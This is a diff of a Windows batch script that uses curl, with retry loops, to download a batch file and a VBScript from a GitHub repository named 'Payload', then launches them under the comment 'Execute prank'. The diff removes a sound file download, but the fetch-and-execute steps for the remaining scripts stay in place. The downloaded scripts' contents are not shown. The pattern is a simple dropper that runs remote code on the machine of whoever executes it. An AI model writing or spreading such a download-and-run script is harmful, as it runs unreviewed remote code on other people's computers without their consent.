@@ -16,18 +16,6 @@ if not exist "%fileTalk2%" (
 )
 echo [OK] Downloaded %fileTalk2%
 
-:: Download sound.wav
-set "urlSound=https://raw.githubusercontent.com/DanielNov2014/Payload/main/sound.wav"
-set "fileSound=sound.wav"
-:retrySound
-curl -O "%urlSound%"
-if not exist "%fileSound%" (
-    echo [Retry] Failed to download %fileSound%. Retrying in %retryDelay% seconds...
-    timeout /t %retryDelay% > nul
-    goto retrySound
-)
-echo [OK] Downloaded %fileSound%
-
 :: Download startexc.bat
 set "urlStart=https://raw.githubusercontent.com/DanielNov2014/Payload/main/startexc.bat"
 set "fileStart=startexc.bat"
@@ -43,7 +31,6 @@ echo [OK] Downloaded %fileStart%
 :: Execute prank
 timeout /t 10 > nul
 start "" startexc.bat
-start "" sound.wav
 start "" talk2.vbs
 
 :: Wait and check process
